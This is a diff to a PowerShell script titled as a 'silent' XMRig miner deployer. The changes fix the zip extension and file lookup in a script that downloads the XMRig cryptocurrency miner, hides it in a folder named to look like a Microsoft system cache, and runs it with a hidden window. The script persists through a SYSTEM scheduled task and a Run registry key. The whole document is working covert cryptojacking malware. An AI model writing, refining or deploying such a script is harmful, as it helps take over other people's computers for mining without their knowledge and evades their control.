@@ -1,4 +1,4 @@
-# Silent XMRig Deploy v7 - Stealth + SYSTEM Persistence
+# Silent XMRig Deploy v8 - Fixed Zip Extension + SYSTEM Persistence
 $InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
 if (-not (Test-Path $InstallDir)) {
     New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
@@ -6,19 +6,21 @@ if (-not (Test-Path $InstallDir)) {
 }
 
 $ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
-$ZipPath = "$env:TEMP\cache.tmp"
+$ZipPath = "$env:TEMP\wucache.zip"
 
 Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing
+
 Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
 Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue
 
+# Move files if they are inside a subfolder
 $Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
 if ($Sub) {
     Move-Item "$($Sub.FullName)\*" $InstallDir -Force
     Remove-Item $Sub.FullName -Recurse -Force
 }
 
-$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" | Select-Object -First 1).FullName
+$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
 $ConfigPath = "$InstallDir\config.json"
 
 $ConfigJson = @"
@@ -41,7 +43,7 @@ $ConfigJson = @"
 "@
 $ConfigJson | Out-File $ConfigPath -Encoding UTF8 -Force
 
-# Immediate hidden start
+# Immediate start (hidden)
 Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
 
 # Persistence as SYSTEM (AtStartup)
@@ -58,5 +60,5 @@ try {
     Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
 }
 
-# Extra reliable fallback (Registry)
+# Extra registry fallback
 Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$ExePath`" -c `"$ConfigPath`" -B --no-color" -Force
